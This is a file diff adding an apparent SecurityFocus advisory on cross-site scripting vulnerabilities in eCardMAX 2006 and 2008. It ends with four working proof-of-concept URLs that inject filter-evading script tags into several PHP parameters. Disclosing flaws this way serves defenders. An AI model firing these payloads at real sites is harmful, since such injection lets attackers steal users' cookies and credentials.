@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/43570/info
+
+eCardMAX is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+eCardMAX 2006 and 2008 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/standard_2006/grabber.php?grab_url=1%3Cscript%3Ealert(1192520984065)%3C/script%3E
+
+http://www.example.com/standard_2006/members.php?cs_message=1%3C/textarea%3E%3CScRiPt%20%0A%0D%3Ealert(846719933916)%3B%3C/ScRiPt%3E
+
+http://www.example.com/standard_2006/resource/games/memory/memory.php?step=show_ins&cat=1%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(1295561226285)%3B%3C/ScRiPt%3E
+
+http://www.www.example.com/gold_2008/resource/games/ephotohunt/ephotohunt.php?step=show_ins&cat=1>"><ScRiPt %0A%0D>alert(416118610559)%3B</ScRiPt>
+
+
+
